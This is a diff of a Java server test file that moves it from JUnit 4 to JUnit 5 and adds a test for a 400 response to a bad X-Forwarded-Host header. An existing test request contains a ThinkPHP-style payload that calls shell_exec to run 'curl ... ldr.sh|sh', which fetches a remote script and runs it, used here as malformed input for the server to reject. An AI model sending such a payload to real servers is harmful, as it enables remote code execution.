@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2010, 2021 Oracle and/or its affiliates. All rights reserved.
+ * Copyright (c) 2010, 2022 Oracle and/or its affiliates. All rights reserved.
  *
  * This program and the accompanying materials are made available under the
  * terms of the Eclipse Public License v. 2.0, which is available at
@@ -21,7 +21,7 @@ import org.apache.http.client.methods.CloseableHttpResponse;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClientBuilder;
 import org.apache.http.message.BasicHttpRequest;
-import org.junit.Test;
+import org.junit.jupiter.api.Test;
 
 import javax.ws.rs.GET;
 import javax.ws.rs.Path;
@@ -35,7 +35,7 @@ import javax.ws.rs.core.Response;
 import java.io.IOException;
 import java.net.URI;
 
-import static org.junit.Assert.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertEquals;
 
 /**
  * @author Paul Sandoz
@@ -58,6 +58,19 @@ public class ExceptionTest extends AbstractJettyServerTester {
                 + "&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://127.0"
                 + ".0.1/ldr.sh|sh";
         BasicHttpRequest request = new BasicHttpRequest("GET", testUri + incorrectFragment);
+        CloseableHttpClient client = HttpClientBuilder.create().build();
+
+        CloseableHttpResponse response = client.execute(new HttpHost(testUri.getHost(), testUri.getPort()), request);
+
+        assertEquals(400, response.getStatusLine().getStatusCode());
+    }
+
+    @Test
+    public void test400StatusCodeForIllegalHeaderValue() throws IOException {
+        startServer(ExceptionResource.class);
+        URI testUri = getUri().build();
+        BasicHttpRequest request = new BasicHttpRequest("GET", testUri.toString() + "/400");
+        request.addHeader("X-Forwarded-Host", "_foo.com");
         CloseableHttpClient client = HttpClientBuilder.create().build();
 
         CloseableHttpResponse response = client.execute(new HttpHost(testUri.getHost(), testUri.getPort()), request);
